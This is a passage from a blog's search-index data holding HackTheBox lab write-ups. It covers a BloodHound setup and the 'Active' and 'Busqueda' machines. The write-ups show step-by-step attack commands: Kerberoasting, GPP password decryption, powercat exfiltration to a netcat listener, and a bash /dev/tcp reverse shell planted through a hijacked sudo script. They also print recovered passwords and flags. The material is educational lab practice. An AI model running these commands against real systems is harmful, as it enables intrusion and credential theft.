http://10.10.14.18/SharpHound.ps1 -Outfile SharpHound.ps1 After transfer it to the Windows Machine, we can import it to PowerShell:\nPS C:\\Users\\svc-alfresco\\Desktop\u0026gt; powershell -ep bypass PS C:\\Users\\svc-alfresco\\Desktop\u0026gt; Import-Module .\\Sharphound.ps1 Now, we can run the script to collect all the information from the domain. SharpHound primarily relies on LDAP queries to gather data from Active Directory. Since LDAP queries are a standard part of domain communication, any domain-authenticated user can execute them, which is why SharpHound doesn’t require administrative privileges for most of its operations.\nPS C:\\Users\\svc-alfresco\\Desktop\u0026gt; Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\Users\\svc-alfresco\\Desktop\\ -OutputPrefix \u0026#34;forest\u0026#34; After executing, we\u0026rsquo;ll see a zip file with all the information. That\u0026rsquo;s what we need to transfer back to our attacking machine. The .bin file that BloodHound generates is a binary file used as a cache for preprocessed data. When you import JSON files collected by SharpHound into BloodHound, it processes the data and stores it in a Neo4j database.\nThe .bin file serves as a local cache of this processed data to improve performance, but we don\u0026rsquo;t necesarilly need to transfer it back to our machine, so we will ignore it.\n*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Desktop\u0026gt; ls Directory: C:\\Users\\svc-alfresco\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 1/10/2025 9:29 AM 43554 forest_20250110092905_BloodHound.zip -a---- 1/10/2025 9:15 AM 1942029 SharpHound.ps1 We can use our favorite transfer method, I will use powercat.exe:\n*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Desktop\u0026gt; powercat -c 10.10.14.18 -p 4444 -i C:\\Users\\svc-alfresco\\Desktop\\forest_20250110092905_BloodHound.zip On our Attacking Machine, we need to open a netcat listener in order to receive the data:\n┌──(s3n㉿kali)-[/opt/bloodhound] └─$ sudo nc -nlvp 4444 \u0026gt; bloodhound.zip listening on [any] 4444 ... connect to [10.10.14.18] from (UNKNOWN) [10.10.10.161] 50906 Once we have the zip file locally on our machine, let\u0026rsquo;s upload it to BloodHound. First, press the Administration option. Import the zip file in the File Ingest option, in the Data Collection section:\nClick and Select the zip file\nNice! It was succesfully uploaded.\nTeaching how to do queries with BloodHound it out of the scope of this post, but let\u0026rsquo;s run a quick \u0026ldquo;Shortest Paths to Domain Admins\u0026rdquo; query to check if the ingestion of the data was successful. It works! You now have a fully functional BloodHound instance up and running, ready to map out and analyze your Active Directory environment.\nStopping the Instance # Stopping the instance is as easy as pressing Ctrl+C on the terminal window where docker-compose is running.\nIf you want to set it up again, just do docker-compose up and you are good to go.\nI hope this guide was helpful in getting everything set up smoothly, as setting up a BloodHound environment could be tricky at first. Give it a try!\n","date":"11 January 2025","externalUrl":null,"permalink":"/posts/bloodhound/","section":"Posts","summary":"Quick explanation on how to get BloodHound up and running in a few minutes! This post include a step by step installation guide of \u003cstrong\u003eBloodHound\u003c/strong\u003e, as well as downloading \u003cstrong\u003eSharpHound\u003c/strong\u003e and uploading it to a machine in order to map out an Active Directory Network.","title":"How to Setup BloodHound Community Edition","type":"posts"},{"content":"","date":"11 / 01 / 2025","externalUrl":null,"permalink":"/pt-pt/tags/tool/","section":"Tags","summary":"","title":"Tool","type":"tags"},{"content":"","date":"11 January 2025","externalUrl":null,"permalink":"/tags/tools/","section":"Tags","summary":"","title":"Tools","type":"tags"},{"content":" Machine Info Platform HackTheBox Operative System Windows Difficulty Easy IP 10.10.10.100 Enumeration # Let\u0026rsquo;s begin the enumeration with Nmap:\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001 -sCV --min-rate 2000 -T5 -n -Pn 10.10.10.100 -oN ports PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-01-04 18:47:44Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5722/tcp open msrpc Microsoft Windows RPC 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 2:1:0: |_ Message signing enabled and required | smb2-time: | date: 2025-01-04T18:48:37 |_ start_date: 2025-01-04T18:21:40 |_clock-skew: -1s There are quite a few ports open. We can begin the enumeration by checking if there is any information on SMB shares:\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ smbclient -N -L \\\\10.10.10.100 Anonymous login successful Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share Replication Disk SYSVOL Disk Logon server share Users Disk The Replication share has some info that we can access:\nsmb: \\\u0026gt; ls active.htb D 0 Sat Jul 21 00:37:44 2018 Credential Gathering # We discover a password on Replication\\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\Groups.xml.\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ cat Groups.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;Groups clsid=\u0026#34;{3125E937-EB16-4b4c-9934-544FC6D24D26}\u0026#34;\u0026gt;\u0026lt;User clsid=\u0026#34;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\u0026#34; name=\u0026#34;active.htb\\SVC_TGS\u0026#34; image=\u0026#34;2\u0026#34; changed=\u0026#34;2018-07-18 20:46:06\u0026#34; uid=\u0026#34;{EF57DA28-5F69-4530-A59E-AAB58578219D}\u0026#34;\u0026gt;\u0026lt;Properties action=\u0026#34;U\u0026#34; newName=\u0026#34;\u0026#34; fullName=\u0026#34;\u0026#34; description=\u0026#34;\u0026#34; cpassword=\u0026#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\u0026#34; changeLogon=\u0026#34;0\u0026#34; noChange=\u0026#34;1\u0026#34; neverExpires=\u0026#34;1\u0026#34; acctDisabled=\u0026#34;0\u0026#34; userName=\u0026#34;active.htb\\SVC_TGS\u0026#34;/\u0026gt;\u0026lt;/User\u0026gt; \u0026lt;/Groups\u0026gt; The file Groups.xml is automatically created on the SYSVOL share when a Group Policy Preference is created. The file contains Groups related information, even passwords. These are encrypted with a private key from Microsoft, but it was published by accident.\nThis is quite old (from around 2014) but is great knoledge to have, as if a system contains old files wich contain a password encrypted from a Group Policy Preference, it can be decripted with the tool gpp-decrypt.\n┌──(s3n㉿kali)-[~] └─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ GPPstillStandingStrong2k18 After finding the password for the SVC_TGS user, we should take a look of the shares that we couldn\u0026rsquo;t access, such as Users, to check if we obtained any privilege on it.\n┌──(s3n㉿kali)-[~] └─$ smbclient \\\\\\\\10.10.10.100\\\\Users -W active.htb -U SVC_TGS Password for [ACTIVE.HTB\\SVC_TGS]: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . DR 0 Sat Jul 21 04:39:20 2018 .. DR 0 Sat Jul 21 04:39:20 2018 Administrator D 0 Mon Jul 16 00:14:21 2018 All Users DHSrn 0 Mon Jul 13 19:06:44 2009 Default DHR 0 Mon Jul 13 20:38:21 2009 Default User DHSrn 0 Mon Jul 13 19:06:44 2009 desktop.ini AHS 174 Mon Jul 13 18:57:55 2009 Public DR 0 Mon Jul 13 18:57:55 2009 SVC_TGS D 0 Sat Jul 21 05:16:32 2018 It looks like it worked! We enumerate again but we don\u0026rsquo;t find anything relevant.\nWe could claim the user flag in the SVC_TGS/Desktop directory but I won\u0026rsquo;t do it, as it wouldn\u0026rsquo;t count in exams like OSCP, as you need an interactive shell.\nWith user SVC_TGS it seems that we don\u0026rsquo;t have a way of getting a foothold on the machine as I tried to RDP. However, we can continue enumerating the internal network as we have valid credentials with this user.\nKerberoasting # Kerberoasting is a post-exploitation technique we can use when assessing Active Directory (AD) environments. The objective is to obtain the password hash of a service account associated with a Service Principal Name (SPN). SPNs are attributes in AD that uniquely tie a service to a user account, enabling Kerberos authentication.\nIn this scenario, as authenticated domain users, we request a Kerberos service ticket for an SPN. The domain controller generates the ticket and encrypts it using the NTLM hash of the service account password linked to the SPN. This ticket is then provided to us. At this stage, we don’t require elevated privileges—just a valid domain user account to request the ticket.\nOnce we retrieve the encrypted ticket, we can crack it offline using tools like Hashcat. If successful, we recover the plaintext password of the service account.\nWe can try to check for users SPNs with Impacket\u0026rsquo;s GetUserSPN tool:\n┌──(s3n㉿kali)-[~/Desktop/Box/recon/Users_Share] └─$ sudo impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies Password: ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation -------------------- ------------- -------------------------------------------------------- -------------------------- -------------------------- ---------- active/CIFS:445 Administrator CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-18 09:06:40.351723 2025-01-04 08:22:56.876969 [-] CCache file is not found. Skipping... $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$00000811e6a2b622980085c3ea266f01$c9cab36b5168bd9a37c25b64bc43aebb6540b44867f3599f0a407d18ad616cf7af9674a71536b36dd1a5010bd6f9bde15ce5e2840134ca36c87da075...8ca32608b5c667b3abeabe5e73fb859a5d002f4ba2472875cf6e40a592e178ad267ae199713a5a84b51b7b52665667ac3e62bb2ab566d2076c7ce31b7f7e25605dc1f4d7854ac3faf219b78b8 Nice! We got the Now, we can try to crack this hash with hashcat:\nsudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$00000811e6a2b622980085c3ea266f01$c9cab36b5168bd9a37c25b64bc43aebb6540b44867f3599f0a407d18ad616cf7af9674a71536b36dd1a5010bd6f9bde15ce5e2840134ca36c87da075...8ca32608b5c667b3abeabe5e73fb859a5d002f4ba2472875cf6e40a592e178ad267ae199713a5a84b51b7b52665667ac3e62bb2ab566d2076c7ce31b7f7e25605dc1f4d7854ac3faf219b78b8:Ticketmaster1968 We found Administrator\u0026rsquo;s password with value Ticketmaster1968. We can try to abuse SMB to stablish a shell with psexec:\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ impacket-psexec Administrator@10.10.10.100 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies Password: [*] Requesting shares on 10.10.10.100..... [*] Found writable share ADMIN$ [*] Uploading file zOdNJqkf.exe [*] Opening SVCManager on 10.10.10.100..... [*] Creating service ROhE on 10.10.10.100..... [*] Starting service ROhE..... [!] Press help for extra shell commands Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt; whoami nt authority\\system Now we can read both flags:\nC:\\\u0026gt; type C:\\Users\\SVC_TGS\\Desktop\\user.txt 40538eb1a29a0cef0b8d9a4d7a3a387f C:\\\u0026gt; type C:\\Users\\Administrator\\Desktop\\root.txt b8737ca7bc28f8b9dcce856e5226956d ","date":"6 January 2025","externalUrl":null,"permalink":"/posts/active/","section":"Posts","summary":"Active is an easy to medium difficulty machine, which features two very prevalent techniques to gain privileges within an Active Directory environment. This machine teaches us about Group Policy Preferences Passwords from Windows and how to abuse them.","title":"Active","type":"posts"},{"content":" Machine Info Platform HackTheBox Operative System Linux Difficulty Easy IP 10.10.11.208 Enumeration # ┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ nmap -p22,80 -sCV --min-rate 2000 -T5 -n -Pn 10.10.11.208 -oN ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA) |_ 256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519) 80/tcp open http Apache httpd 2.4.52 |_http-title: Did not follow redirect to http://searcher.htb/ |_http-server-header: Apache/2.4.52 (Ubuntu) Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel We can see that the web on port 80 redirects to searcher.htb. Let\u0026rsquo;s add it to /etc/hosts.\nAs soon as we land on the page, we see the following: A quick look shows the version of the App that is running behind this website, which is Searchor 2.4.0. If we look for vulnerabilities, we find the following exploit\nExploitation # Let\u0026rsquo;s run the exploit:\n┌──(s3n㉿kali)-[~/Desktop/Box/exploitation] └─$ ./exploit.sh http://searcher.htb/ 10.10.14.10 4646 We put a netcat listener to receive the connection:\n┌──(s3n㉿kali)-[~/Desktop/Box/exploitation] └─$ nc -nlvp 4646 listening on [any] 4646 ... connect to [10.10.14.10] from (UNKNOWN) [10.10.11.208] 40288 We succesfully enter the machine as user svc .\nsvc@busqueda:~$ cat user.txt cat user.txt 75a17...8bd3e Privilege Escalation # Looking though the system files, we find a .git with credentials in the app folder.\nsvc@busqueda:/var/www/app/.git$ cat config [core] repositoryformatversion = 0 ... [remote \u0026#34;origin\u0026#34;] url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git fetch = +refs/heads/*:refs/remotes/origin/* [branch \u0026#34;main\u0026#34;] remote = origin merge = refs/heads/main The user is cody and the password is jh1usoih2bkjaspwe92 for an application in a subdomain called gitea. Let\u0026rsquo;s add it to the /etc/hosts and take a look.\nInside here, we don\u0026rsquo;t find anything interesing, appart that we can see a user called administrator. Although, we can try to SSH with the svc user and cody\u0026rsquo;s password:\n┌──(s3n㉿kali)-[~/Desktop/Box/exploitation] └─$ ssh svc@10.10.11.208 svc@10.10.11.208\u0026#39;s password: Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-69-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage ... Last login: Tue Apr 4 17:02:09 2023 from 10.10.14.19 Let\u0026rsquo;s check the sudo privileges that this user has:\nsvc@busqueda:/opt/scripts$ sudo -l User svc may run the following commands on busqueda: (root) /usr/bin/python3 /opt/scripts/system-checkup.py * This user has the right to execute that script inside /opr/scripts.\nIf we run it, we can see the following options:\nsvc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py * Usage: /opt/scripts/system-checkup.py \u0026lt;action\u0026gt; (arg1) (arg2) docker-ps : List running docker containers docker-inspect : Inpect a certain docker container full-checkup : Run a full system checkup After some investigation, we discover the docker-inspect option can be use to retrieve information from the docker containers that are running in the machine, before seen with the docker-ps option.\nsvc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect \u0026#39;{{json .}}\u0026#39; gitea | jq \u0026#34;Env\u0026#34;: [ \u0026#34;USER_UID=115\u0026#34;, \u0026#34;USER_GID=121\u0026#34;, \u0026#34;GITEA__database__DB_TYPE=mysql\u0026#34;, \u0026#34;GITEA__database__HOST=db:3306\u0026#34;, \u0026#34;GITEA__database__NAME=gitea\u0026#34;, \u0026#34;GITEA__database__USER=gitea\u0026#34;, \u0026#34;GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh\u0026#34;, \u0026#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#34;, \u0026#34;USER=git\u0026#34;, \u0026#34;GITEA_CUSTOM=/data/gitea\u0026#34; ], It looks like we find more credentials for the gitea application. Let\u0026rsquo;s try to log in as administrator with these credentials.\nNice! Now we can check the content of the scripts in the /opt folder.\nReading the script system-checkup.py script we notice that the full-checkup.sh script is referenced as if it was in the same folder:\n... elif action == \u0026#39;full-checkup\u0026#39;: try: arg_list = [\u0026#39;./full-checkup.sh\u0026#39;] print(run_command(arg_list)) print(\u0026#39;[+] Done!\u0026#39;) except: print(\u0026#39;Something went wrong\u0026#39;) exit(1) ... We can abuse this by creating our own malicious script and reference it, as we are executing it with sudo privileges:\nsvc@busqueda:/tmp$ cat full-checkup.sh #!/bin/bash bash -c \u0026#39;exec bash -i \u0026amp;\u0026gt;/dev/tcp/10.10.14.12/4647 \u0026lt;\u0026amp;1\u0026#39; Keep in mind that you need to grant execution privileges to the script to run, as this was a mistake of mine that took me quite a lot of time to figure out.\nNow, we set a netcat listener and execute the malicious script:\nsvc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup In the netcat we receive the root shell:\n┌──(s3n㉿kali)-[~/Desktop/Box/exploitation] └─$ nc -nlvp 4647 listening on [any] 4647 ... connect to [10.10.14.12] from (UNKNOWN) [10.10.11.208] 47020 root@busqueda:/tmp# whoami root Nice! We rooted the machine.\nroot@busqueda:~# cat /root/root.txt cat /root/root.txt ccd03ae...0e87097 ","date":"6 January 2025","externalUrl":null,"permalink":"/posts/busqueda/","section":"Posts","summary":"Busqueda is an Easy Difficulty Linux machine that involves exploiting a command injection vulnerability present in a \u003ccode\u003ePython\u003c/code\u003e module to gain user-level access to the machine. To escalate privileges to \u003ccode\u003eroot\u003c/code\u003e, we discover credentials within a \u003ccode\u003eGit\u003c/code\u003e config file, allowing us to log into a local \u003ccode\u003eGitea\u003c/code\u003e service.","title":"Busqueda","type":"posts"},{"content":"","date":"18 December 2024","externalUrl":null,"permalink":"/tags/about/","section":"Tags","summary":"","title":"About","type":"tags"},{"content":" Biography # Hi! My name is Marcos, and I’m a 21-year-old Cybersecurity student. On the Internet, you might know me as S3n or S3ntinl. I’m currently pursuing a Master’s Degree in Cybersecurity for Information Technology Environments and preparing for the OSCP certification.\nI spend most of my time coding, solving CTFs, or overall, studying. My passion lies into hacking and finding creative ways to solve problems.\nThis blog is my way of documenting my journey while sharing, not just my progress but also tools, techniques, and lessons I pick up along the way. I hope it becomes a resource for others, whether you’re a beginner exploring cybersecurity or an experienced hacker looking for fresh perspectives.\nFeel free to reach out to any of my Media if you have any questions or ideas!\n","date":"18 December 2024","externalUrl":null,"permalink":"/about/","section":"S3ntinl","summary":"A little introduction about myself!","title":"Who is S3ntinl?","type":"page"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]